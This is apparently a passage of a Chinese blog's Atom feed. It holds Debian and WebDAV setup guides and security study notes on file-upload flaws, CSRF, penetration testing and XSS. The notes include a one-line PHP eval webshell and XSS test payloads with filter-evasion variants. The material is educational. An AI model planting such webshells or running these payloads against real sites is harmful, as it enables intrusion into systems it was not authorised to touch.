    <content type="html"><![CDATA[<h1 id="一、安装相关包"><a href="#一、安装相关包" class="headerlink" title="一、安装相关包"></a>一、安装相关包</h1><pre><code class="shell">apt updateapt install davfs2</code></pre><p>借助davfs2这个工具挂载WebDAV服务，其它操作也一样的道理</p><h2 id="二、获取坚果云WebDAV"><a href="#二、获取坚果云WebDAV" class="headerlink" title="二、获取坚果云WebDAV"></a>二、获取坚果云WebDAV</h2><p><a href="https://www.jianguoyun.com/d/home#/safety">坚果云链接</a><br>示例：</p><pre><code class="text">服务器地址： https://dav.jianguoyun.com/dav/账户：test@aliyun.com(账户)密码：awyc5p7rgwq95e8c (应用密码)</code></pre><h1 id="三、配置davfs2"><a href="#三、配置davfs2" class="headerlink" title="三、配置davfs2"></a>三、配置davfs2</h1><p><strong>1、修改davfs.conf文件</strong><br>vim  &#x2F;etc&#x2F;davfs2&#x2F;davfs2.conf<br>找到对应的值改为1</p><pre><code class="shell">ignore_dav_header 1</code></pre><p>ignore_dav_header 1 是为了兼容坚果云的webdav协议</p><p><strong>2、配置webdav密码到本地</strong></p><p>添加前面拿到的坚果云相关信息保存到secrets文件<br>vim &#x2F;etc&#x2F;davfs2&#x2F;secrets</p><pre><code class="shell">https://dav.jianguoyun.com/dav/ 账号 应用密码</code></pre><p>url中的dav&#x2F;后面可以选择是否加入自己坚果云文件夹</p><p><strong>3、配置挂载</strong><br>创建挂载目录</p><pre><code class="shell">mkdir /mnt/cloud_disk</code></pre><p>手动挂载</p><pre><code class="shell">mount -t davfs -o noexec https://dav.jianguoyun.com/dav /mnt/cloud_disk/</code></pre><p>自动挂载(根据需求配置)</p><ul><li>自动挂载原理上就是开机执行一下手动挂载的命令</li><li>其它linux发行版自行查找设置开机自启脚本的方法，这里以debian作为演示</li></ul><p>把脚本写入到一个&#x2F;etc&#x2F;init.d&#x2F;的脚本文件里面</p><pre><code class="bash">echo &quot;mount -t davfs -o noexec https://dav.jianguoyun.com/dav /mnt/cloud_disk/&quot; &gt; /etc/init.d/cloud_disk.sh</code></pre><p>赋予执行权限并把这个脚本加入update-rc.d中</p><pre><code class="bash">chmod +x /etc/init.d/cloud_disk.shupdate-rc.d cloud_disk.sh defaults 99</code></pre><p>把脚本给到systemd来管理自启<br>创建一个.service的文件</p><pre><code class="gradle">touch /etc/systemd/system/cloud_disk.service</code></pre><p>添加以下内容</p><pre><code class="ini">[Unit]Description=My custom startup script [Service]ExecStart=/etc/init.d/cloud_disk.sh [Install]WantedBy=multi-user.target</code></pre><p>设置开机自启</p><pre><code class="bash">systemctl enable cloud_disk.servicesystemctl start cloud_disk.service</code></pre><p>加入到&#x2F;etc&#x2F;fstab</p><pre><code class="bash">echo &quot;https://dav.jianguoyun.com/dav/ /mnt/cloud_disk/ davfs user,noauto,x-systemd.automount 0 0&quot; &gt;&gt; /etc/fstab</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、安装相关包&quot;&gt;&lt;a href=&quot;#一、安装相关包&quot; class=&quot;headerlink&quot; title=&quot;一、安装相关包&quot;&gt;&lt;/a&gt;一、安装相关包&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;apt update
apt install davfs</summary>
      
    
    
    
    <category term="linux" scheme="http://www.tanglx.cn/categories/linux/"/>
    
    
    <category term="linux" scheme="http://www.tanglx.cn/tags/linux/"/>
    
    <category term="debian" scheme="http://www.tanglx.cn/tags/debian/"/>
    
  </entry>
  
  <entry>
    <title>debian基础配置</title>
    <link href="http://www.tanglx.cn/2025/01/10/linux/debian%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    <id>http://www.tanglx.cn/2025/01/10/linux/debian%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</id>
    <published>2025-01-10T03:47:40.000Z</published>
    <updated>2025-01-21T13:30:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、配置软件源"><a href="#一、配置软件源" class="headerlink" title="一、配置软件源"></a>一、配置软件源</h1><p>编辑<code>/etc/apt/sources.list</code>，添加下面地址(bookworm为debian12的代号，其它debian需要更换代号)</p><pre><code class="shell">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free non-free-firmware</code></pre><p>更新源</p><pre><code class="shell">sudo apt update</code></pre><h1 id="二、配置静态地址"><a href="#二、配置静态地址" class="headerlink" title="二、配置静态地址"></a>二、配置静态地址</h1><p>查看网卡名称<code>ip a</code><br>编辑网卡配置文件<code>vi /etc/network/interfaces</code></p><pre><code class="shell">auto ens32allow-hotplug ens32iface ens32 inet staticaddress 192.168.88.150netmask 255.255.255.0gateway 192.168.88.2</code></pre><p>重启网卡<code>systemctl restart networking.service</code></p><p>配置dns<code>vi /etc/resolv.conf</code></p><pre><code class="shell">nameserver 114.114.114.114nameserver 8.8.8.8nameserver 8.8.8.4</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、配置软件源&quot;&gt;&lt;a href=&quot;#一、配置软件源&quot; class=&quot;headerlink&quot; title=&quot;一、配置软件源&quot;&gt;&lt;/a&gt;一、配置软件源&lt;/h1&gt;&lt;p&gt;编辑&lt;code&gt;/etc/apt/sources.list&lt;/code&gt;，添加下面地址(bookwo</summary>
      
    
    
    
    <category term="linux" scheme="http://www.tanglx.cn/categories/linux/"/>
    
    
    <category term="linux" scheme="http://www.tanglx.cn/tags/linux/"/>
    
    <category term="debian" scheme="http://www.tanglx.cn/tags/debian/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://www.tanglx.cn/2025/01/05/%E7%BD%91%E5%AE%89/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.tanglx.cn/2025/01/05/%E7%BD%91%E5%AE%89/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-01-05T08:53:35.000Z</published>
    <updated>2025-01-05T13:10:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、文件上传漏洞的原理"><a href="#一、文件上传漏洞的原理" class="headerlink" title="一、文件上传漏洞的原理"></a>一、文件上传漏洞的原理</h1><p>文件上传漏洞是指攻击者通过某种方式将恶意文件上传到目标服务器，从而获取服务器控制权、篡改数据或执行其他恶意操作的安全漏洞。其原理主要包括以下几点：</p><ul><li>许多网站和应用程序都有合法的文件上传功能，比如用户上传头像、文档、图片等。正常情况下，服务器会对上传的文件进行一定的检查和处理。但是，如果这些检查机制不完善，攻击者就可以利用这个合法的上传途径，上传恶意文件。</li><li>例如，一个允许用户上传图片的论坛，正常情况下应该只允许上传符合规定格式（如 JPEG、PNG 等）的图像文件。但是，如果服务器端没有对文件类型进行严格验证，攻击者就可能上传一个包含恶意脚本的 PHP 文件，伪装成图片文件（通过修改文件扩展名等手段）。</li></ul><h1 id="二、webshell"><a href="#二、webshell" class="headerlink" title="二、webshell"></a>二、webshell</h1><p>webshell的收集项目地址（<a href="https://github.com/tennc/webshell">链接</a>）包含了各种常用的webshell<br><strong>1、一句话木马</strong></p><ul><li>代码短，只有一行代码。</li><li>场景多，可以单独生产文件，也可以</li><li>插入到图片中，安全性高，隐秘性强，可变形免杀</li></ul><pre><code class="php">&lt;?php&gt;    @eval($_POST[&#39;muma&#39;]);&lt;?&gt;</code></pre><p><strong>2、小马</strong></p><ul><li>体积小，功能少</li><li>只有文件上传功能</li></ul><p><strong>3、大马</strong></p><ul><li>体积大、功能全</li><li>能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权</li></ul><h1 id="webshell工具"><a href="#webshell工具" class="headerlink" title="webshell工具"></a>webshell工具</h1><p>中国菜刀<br>中国蚁剑<br>weevely<br>哥斯拉 godzilla<br>冰蝎 behinder</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、文件上传漏洞的原理&quot;&gt;&lt;a href=&quot;#一、文件上传漏洞的原理&quot; class=&quot;headerlink&quot; title=&quot;一、文件上传漏洞的原理&quot;&gt;&lt;/a&gt;一、文件上传漏洞的原理&lt;/h1&gt;&lt;p&gt;文件上传漏洞是指攻击者通过某种方式将恶意文件上传到目标服务器，从而获</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="测试" scheme="http://www.tanglx.cn/tags/%E6%B5%8B%E8%AF%95/"/>
    
    <category term="文件上传漏洞" scheme="http://www.tanglx.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞分析与防御</title>
    <link href="http://www.tanglx.cn/2024/12/29/%E7%BD%91%E5%AE%89/CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>http://www.tanglx.cn/2024/12/29/%E7%BD%91%E5%AE%89/CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/</id>
    <published>2024-12-29T11:41:32.000Z</published>
    <updated>2024-12-29T11:50:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、CSRF漏洞的概念"><a href="#一、CSRF漏洞的概念" class="headerlink" title="一、CSRF漏洞的概念"></a>一、CSRF漏洞的概念</h1><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击</p><h2 id="CSRF漏洞的防御"><a href="#CSRF漏洞的防御" class="headerlink" title="CSRF漏洞的防御"></a>CSRF漏洞的防御</h2><blockquote><p>1、判断一个请求来自于本网站，还是来自于第三方网站(Referer来源)<br>2、对敏感信息的操作增加安全的token；<br>3、对敏感信息的操作增加安全的验证码；<br>4、对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、CSRF漏洞的概念&quot;&gt;&lt;a href=&quot;#一、CSRF漏洞的概念&quot; class=&quot;headerlink&quot; title=&quot;一、CSRF漏洞的概念&quot;&gt;&lt;/a&gt;一、CSRF漏洞的概念&lt;/h1&gt;&lt;p&gt;Cross-site request fo</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="测试" scheme="http://www.tanglx.cn/tags/%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CSRF" scheme="http://www.tanglx.cn/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>cisp-pte学习笔记</title>
    <link href="http://www.tanglx.cn/2024/12/29/%E7%BD%91%E5%AE%89/cisp-pte%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.tanglx.cn/2024/12/29/%E7%BD%91%E5%AE%89/cisp-pte%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-12-29T11:41:32.000Z</published>
    <updated>2025-03-26T07:36:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p><strong>cisp-pte认证介绍</strong><br>cisp-pte隶属于cisp，cisp全称<code>注册信息安全专业人员</code>(Certified Information Security Professional)</p><p><strong>cisp-pte认证</strong></p><ul><li>国内首个国家级技能认证证书</li><li>国内评定安全服务工程师是否具备渗透测试资质的唯一证书</li><li>实操技能考核为主（80%），理论知识考察为辅(20%)</li></ul><p><strong>颁发机构</strong>：中国信息安全评测中心</p><h1 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h1><p><strong>渗透测试概念：</strong><br>  渗透测试是模拟黑客攻击，通过识别、利用系统漏洞，评估安全风险并提出改进建议的安全评估方法。</p><h2 id="1、渗透测试分类："><a href="#1、渗透测试分类：" class="headerlink" title="1、渗透测试分类："></a>1、渗透测试分类：</h2><table><thead><tr><th>分类</th><th>描述</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>黑盒渗透测试</td><td>测试人员没有目标系统的任何信息，从外部进行测试，模拟黑客攻击行为。</td><td>完全模拟外部攻击者，接近真实攻击。</td><td>测试时间较长，效率较低。</td></tr><tr><td>白盒渗透测试</td><td>测试人员拥有目标系统的详细信息，如源代码、系统架构、网络拓扑等。</td><td>深入评估系统安全性，发现设计和实现中的漏洞。</td><td>不完全模拟外部攻击，可能错失外部攻击视角。</td></tr><tr><td>灰盒渗透测试</td><td>测试人员拥有部分目标系统的信息(如部分源代码或有限的访问权限)。</td><td>结合外部攻击与内部漏洞测试，高效深入。</td><td>无法完全测试所有可能的漏洞。</td></tr></tbody></table><p><strong>网络安全分类：</strong><br>1、二进制安全:对软件进行破解。<br>2、web安全:对在线的网站进行破解，从而达到某些目的性。RCE<br>3、工控安全:工厂自动化系统的入侵<br>4、物联网安全:家里的路由器，冰箱，微波炉，电视机等都可以通过APP或者其他方式进行控制。<br>5、数据安全<br>6、社会工程学 :欺骗的艺术</p><h2 id="2、渗透测试流程："><a href="#2、渗透测试流程：" class="headerlink" title="2、渗透测试流程："></a>2、渗透测试流程：</h2><table><thead><tr><th>阶段</th><th>目的</th><th>活动</th></tr></thead><tbody><tr><td>1、信息收集</td><td>收集目标系统的公开信息，为后续攻击做准<br/>备</td><td>1、使用搜索引擎，社交媒体、WHOIS等收集<br/>信息<br/>2、网络扫描，识别开放端口和服务DNS查询                                                  3、收集子域名等信息</td></tr><tr><td>2、扫描与枚举</td><td>识别系统中的漏洞和弱点</td><td>1、端口扫描(如使用Nmap)<br/>2、漏洞扫描(如使用Nessus、OpenVAS)<br/>3、服务枚举，识别服务版本</td></tr><tr><td>3、漏洞利用</td><td>利用已发现的漏洞进行攻击，尝试获得系统控制权。</td><td>1、漏洞利用，攻击漏洞(如SQL注入、缓冲区溢出等)<br/>2、社会工程学攻击(如钓鱼邮件、电话欺骗)<br/>3、后渗透操作，进一步控制目标</td></tr><tr><td>4、权限提升与横向移动</td><td>提升权限，并在系统中横向移动，获取更多敏感数据。</td><td>1、权限提升(通过漏洞、弱密码等)<br/>2、横向移动，渗透到更多系统或账户</td></tr><tr><td>5、数据收集与分析</td><td>收集目标系统的敏感数据，验证渗透测试结果</td><td>1、收集密码文件、配置文件、数据库等敏感信息<br/>2、保存测试过程中的证据</td></tr><tr><td>6、清理与恢复</td><td>清理渗透测试中留下的痕迹，恢复系统至原始状态。</td><td>1、删除测试过程中创建的账户、脚本、日志等<br/>2、确保系统恢复至测试前状态</td></tr><tr><td>7、报告与修复建议</td><td>生成渗透测试报告，提供修复建议。</td><td>1、攒写测试报告，记录漏洞、攻击方式和影响<br/>2、提供修复建议，帮助组织改进安全性</td></tr></tbody></table><h2 id="3、PTES渗透测试执行标准："><a href="#3、PTES渗透测试执行标准：" class="headerlink" title="3、PTES渗透测试执行标准："></a>3、PTES渗透测试执行标准：</h2><blockquote><p>PTES(Penetration Testing ExecutionStandard，渗透测试执行标准)是一个广泛使用的渗透测试框架，旨在规范和标准化渗透测试的执行过程，确保渗透测试的高效性和系统性。它为渗透测试人员提供了一个结构化的指南，涵盖了渗透测试的各个阶段。</p></blockquote><table><thead><tr><th>阶段</th><th>描述</th></tr></thead><tbody><tr><td>1.前期交互(Pre-engagement<br/>Interactions)</td><td>在测试开始之前，测试团队与客户进行沟通，明确测试的范国、目标、限制以及相关协议，此阶段还包括与客户达成协议，确保测试活动合法、道德。</td></tr><tr><td>2.信息收集(Information<br/>Gathering)</td><td>收集目标系统的公开信息，包括域名、IP地址、员工信息等，通常使用OSINT(开源情报)技术，通过此阶段了解目标的基本结构、攻击面及潜在的漏洞。</td></tr><tr><td>3.威助建模(Threat Modeling)</td><td>根把收集到的信息，识别潜在的攻击者、攻击路径及可能利用的漏洞，通过评估威胁建模帮助确定最优的攻击路径。</td></tr><tr><td>4.漏洞分析(Vulnerability<br/>Analysis)</td><td>使用自动化工具和手动技术分析目标系统的漏洞，查找应用程序、网络和系统的已知漏洞，识别出可能的攻击入口。</td></tr><tr><td>5.渗透攻击(Exploitation)</td><td>利用已发现的漏洞进行攻击，验证漏洞是否可被利用，尝试获取系统访问权限。此阶段模拟真实黑客攻击，验证漏洞的严重性。</td></tr><tr><td>6.后渗透攻击(Post-<br/>exploitation)</td><td>成功渗透系统后，进行权限提升、横向渗透、敏感数据获取等操作，以模拟攻击者在完全控制系统后的行为，通过此阶段帮助识别潜在的长期风险。</td></tr><tr><td>7.报告编写(Reporting)</td><td>编写渗透测试报告，记录所有测试活动、发现的漏洞、成功利用的攻击路径以及影响评估。报告还应提供修复建议和提高安全性的措施。</td></tr><tr><td>8.漏洞修复与再评估<br/>(Remediation &amp; Re-testing)</td><td>客户对报告中的漏洞进行修复后，渗透测试团队应进行再测试，验证漏洞是否已修复，并评估修复效果。</td></tr></tbody></table><h2 id="4、信息收集"><a href="#4、信息收集" class="headerlink" title="4、信息收集"></a>4、信息收集</h2><p><strong>主动信息收集</strong><br>通过直接访问、扫描网站，这种流量将流经网站。<br><strong>被动信息收集</strong><br>利用第三方的服务对目标进行访问。<br><img src="https://picture.tanglx.cn/web/2025/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png" alt="enter description here"></p><h2 id="5、常见端口"><a href="#5、常见端口" class="headerlink" title="5、常见端口"></a>5、常见端口</h2><table><thead><tr><th>端口</th><th>风险描述</th><th>其它</th></tr></thead><tbody><tr><td>21、69</td><td>FTP&#x2F;TFTP服务，可能存在弱口令暴破匿名用户登录</td><td></td></tr><tr><td>22</td><td>SSH服务，可能存在弱口令暴破，端口映射</td><td></td></tr><tr><td>80</td><td>HTTP端口，常见web漏洞都可能存在</td><td></td></tr><tr><td>389</td><td>LDAP目录访问协议，有可能存在注入，弱口令，域控开放此端口</td><td></td></tr><tr><td>445</td><td>SMB服务端口，永恒之蓝等</td><td></td></tr><tr><td>2475</td><td>Docker端口，可能存在Docker提权、Docker逃逸</td><td></td></tr><tr><td>3389</td><td>RDP服务，可能存在弱口令漏洞或者CVE-2019-0708</td><td></td></tr><tr><td>6379</td><td>Redis数据库端口，可能存在Redis未授权访问漏洞、主从复制等</td><td></td></tr><tr><td>7001、7002</td><td>Weblogic，可能存在各种Weblogic反序列化漏洞</td><td></td></tr><tr><td>3306</td><td>MySQL数据库，可能存在弱口令暴破、注入、UDF提权等</td><td></td></tr><tr><td>1433</td><td>SQL Server数据库可能存在爆破、注入、xp_cmdshell提权等</td><td></td></tr><tr><td>5900</td><td>VNC服务，可能存在爆破、弱口令认证绕过</td><td></td></tr></tbody></table><h2 id="6、http协议"><a href="#6、http协议" class="headerlink" title="6、http协议"></a>6、http协议</h2><p><strong>http工作特点：</strong><br>1、无状态、2、支持c&#x2F;s模式、3、无连接、4、灵活、5、简单快速</p><p><strong>Cookie：</strong><br>Cookie是通过客户端保持状态的解决方案。从定义上来说，Cookie就是由服务器发给客户端的特殊信息，而这些信息以文本文件的方式存放在客户端，然后客户端每次尚服务器发送请求的时候都会带上这些特殊的信息<br>特点：<code>存储在客户端</code></p><p><strong>Session:</strong><br>Session叫会话，主要是用来检查请求数据中的Cookie字段是否在服务器存在和是否合法.<br>特点：<code>存储在服务端</code></p><p><strong>Cookie和Session的联系：</strong><br>由于HTTP协议是无状态，这个时候就需要有一个机制来告诉服务端本次操作用户是否登录，是哪个用户在执行的操作，那这套机制的实现就需要 Cookie和Session配合。</p><p><strong>报文请求格式:</strong><br>第一部分:请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本，请求类型为<code>POST</code> 要访问的资源为<code>/</code> ，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分:请求头部用来说明服务器要使用的附加信息。<br>第三部分:空行，空行是必须的。第四部分的请求数据为空，也必须有空行。<br>第四部分:请求数据也叫主体，可以添加任意的其他数据。</p><p><img src="https://picture.tanglx.cn/web/2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250323210604.png" alt="报文请求格式"></p><p><strong>请求类型：</strong></p><table><thead><tr><th><strong>方法</strong></th><th><strong>用途</strong></th><th><strong>参数位置</strong></th><th><strong>安全性</strong></th><th><strong>幂等性</strong></th><th><strong>请求体支持</strong></th><th><strong>缓存</strong></th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>从服务器获取数据（查询操作）</td><td>参数附加在 <strong>URL</strong> 后（?key&#x3D;value）</td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>POST</strong></td><td>向服务器提交数据（写入操作）</td><td>参数放在 HTTP <strong>请求体</strong>（Body）中</td><td>不安全</td><td>非幂等</td><td>支持</td><td>默认不缓存</td></tr><tr><td><strong>PUT</strong></td><td>替换资源（完整更新）</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>PATCH</strong></td><td>部分更新资源</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>DELETE</strong></td><td>删除资源</td><td><strong>URL路径标识</strong>（如 <code>/res/123</code>）</td><td>不安全</td><td>幂等</td><td>支持（可选）</td><td>不可缓存</td></tr><tr><td><strong>HEAD</strong></td><td>获取资源元数据（无响应体）</td><td><strong>URL 查询参数</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>OPTIONS</strong></td><td>获取服务器支持的请求方法或跨域配置</td><td><strong>URL路径或全局</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>TRACE</strong></td><td>回显客户端请求（用于调试）</td><td><strong>URL路径</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>CONNECT</strong></td><td>建立隧道（用于代理转发 HTTPS）</td><td><strong>目标主机和端口</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr></tbody></table><h1 id="三、注入漏洞"><a href="#三、注入漏洞" class="headerlink" title="三、注入漏洞"></a>三、注入漏洞</h1><h1 id="四、文件处理漏洞"><a href="#四、文件处理漏洞" class="headerlink" title="四、文件处理漏洞"></a>四、文件处理漏洞</h1><h1 id="五、跨站脚本（xss）漏洞、请求伪造漏洞"><a href="#五、跨站脚本（xss）漏洞、请求伪造漏洞" class="headerlink" title="五、跨站脚本（xss）漏洞、请求伪造漏洞"></a>五、跨站脚本（xss）漏洞、请求伪造漏洞</h1><h1 id="六、访问控制漏洞-会话管理漏洞"><a href="#六、访问控制漏洞-会话管理漏洞" class="headerlink" title="六、访问控制漏洞 会话管理漏洞"></a>六、访问控制漏洞 会话管理漏洞</h1><h1 id="七、Windows操作系统、linux操作系统"><a href="#七、Windows操作系统、linux操作系统" class="headerlink" title="七、Windows操作系统、linux操作系统"></a>七、Windows操作系统、linux操作系统</h1><h1 id="八、中间件安全、数据库安全"><a href="#八、中间件安全、数据库安全" class="headerlink" title="八、中间件安全、数据库安全"></a>八、中间件安全、数据库安全</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;一、介绍&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;cisp-pte认证介绍&lt;/strong&gt;&lt;br&gt;cisp-pte隶属于cisp，</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="渗透测试" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="cisp-pte" scheme="http://www.tanglx.cn/tags/cisp-pte/"/>
    
  </entry>
  
  <entry>
    <title>xss漏洞</title>
    <link href="http://www.tanglx.cn/2024/12/22/%E7%BD%91%E5%AE%89/xss%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.tanglx.cn/2024/12/22/%E7%BD%91%E5%AE%89/xss%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-22T08:33:32.000Z</published>
    <updated>2024-12-29T11:44:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="一、xss漏洞概念"><a href="#一、xss漏洞概念" class="headerlink" title="一、xss漏洞概念"></a>一、xss漏洞概念</h2><p>XSS（跨站脚本攻击，Cross-Site Scripting）是一种安全漏洞，它允许攻击者在网页上注入恶意脚本。这些脚本可能用于盗取cookie，盗取用户数据、操纵DOM、进行网络钓鱼等。</p><h2 id="二、xss漏洞解决办法"><a href="#二、xss漏洞解决办法" class="headerlink" title="二、xss漏洞解决办法"></a>二、xss漏洞解决办法</h2><blockquote><p>1、对所有的输入进行过滤和清理，确保输入的数据不包含任何可能导致XSS的字符或序列。</p><p>2、对所有的输出进行编码，确保输出的数据不会被浏览器解释为代码。</p><p>3、使用内容安全策略（CSP），它能有效地限制网页上可以加载的资源。</p><p>4、使用HTTPOnly标志，防止脚本通过document.cookie获取cookie数据。</p><p>5、对于富文本内容，使用可信的HTML解析器，并进行适当的转义。</p></blockquote><h2 id="三、xss漏洞payload"><a href="#三、xss漏洞payload" class="headerlink" title="三、xss漏洞payload"></a>三、xss漏洞payload</h2><p> 在某个网页的提交内容处添加以下代码，测试是否有弹窗跳出，如果有则说明，该网站存在漏洞<br> <a href="https://github.com/payloadbox/xss-payload-list.git">更多payload</a><br> <strong>典型脚本</strong></p><pre><code class="javascript">&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p><strong>利用 HTML 标签的属性脚本</strong></p><pre><code class="javascript">&quot;&gt;&lt;img src=x οnerrοr=alert(&quot;XSS&quot;);&gt;&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</code></pre><p><strong>变形方法脚本</strong><br>大小写</p><pre><code class="javascript">&lt;sCript&gt;alert(&#39;xss&#39;)&lt;/Script&gt;        将标签中的部分小写字母改为大写</code></pre><p>双写</p><pre><code class="javascript">&lt;scrscriptipt&gt;alert(&#39;xss&#39;)&lt;/scrscriptipt&gt;        对原来的&lt;script&gt;标签变形</code></pre><p>引号</p><pre><code class="javascript">&lt;img src=&quot;#&quot; onerror=&quot;alert(&#39;xss&#39;)&quot;/&gt;        双引号包裹执行命令的alert函数&lt;img src=&quot;#&quot; onerror=alert`xss`/&gt;        反引号代替括号包裹xss内容</code></pre><p>&#x2F; 代替空格</p><pre><code class="javascript">&lt;img/src=&#39;#&#39;/onerror=&#39;alert(&#39;xss&#39;)&#39;/&gt;</code></pre><p>Tab 与回车</p><pre><code class="javascript">在语句中穿插 Tab和回车&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;click me!&lt;/a&gt;</code></pre><p>编码</p><pre><code class="javascript">&lt;a href=&quot;j&amp;#97;v&amp;#x61;script:alert(&#39;xss&#39;)&gt;click me!&lt;/a&gt;        HTML实体编码%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E        URL编码</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;一、xss漏洞概念&quot;&gt;&lt;a href=&quot;#一、xss漏洞概念&quot; class=&quot;headerlink&quot; title=&quot;一、xss漏洞概念&quot;&gt;&lt;/a&gt;一、xss漏洞概念&lt;/h2&gt;&lt;p&gt;XSS（跨站脚本攻击，Cross-Site Scripti</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="测试" scheme="http://www.tanglx.cn/tags/%E6%B5%8B%E8%AF%95/"/>
    
